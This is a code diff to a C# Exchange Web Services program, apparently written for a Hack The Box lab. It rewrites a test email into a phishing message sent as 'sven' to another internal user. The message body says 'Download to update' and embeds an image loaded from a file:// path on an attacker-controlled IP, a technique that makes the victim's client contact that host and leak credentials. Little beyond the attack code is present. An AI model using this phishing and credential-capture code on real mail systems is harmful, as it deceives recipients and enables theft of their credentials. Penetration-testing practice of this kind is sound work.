@@ -1,4 +1,9 @@
-﻿using System;
+﻿// Using VS Code
+// Run below command to install package: Microsoft.Exchange.WebServices
+// dotnet add package Microsoft.Exchange.WebServices --version 2.2.0
+// dotnet run
+
+using System;
 using System.Net;
 using Microsoft.Exchange.WebServices.Data;
 
@@ -22,10 +27,14 @@ namespace HelloWorld
     //   service.AutodiscoverUrl("sven@htb.local", RedirectionUrlValidationCallback);
       service.Url = new Uri("https://10.10.10.210/EWS/Exchange.asmx");
       EmailMessage email = new EmailMessage(service);
-      email.ToRecipients.Add("sven@htb.local");
-      email.Subject = "HelloWorld";
-      email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
-      email.Send();
+        email.ToRecipients.Add("alex@htb.local");
+
+      email.Subject = "Hello from sven";
+    //   email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
+      email.Body = new MessageBody("<html><h1>Download to update</h1><img src='file://10.10.14.12/image.jpg'></html>");
+    
+      // email.Send();
+      email.SendAndSaveCopy();
     }
     private static bool RedirectionUrlValidationCallback(string redirectionUrl)
     {
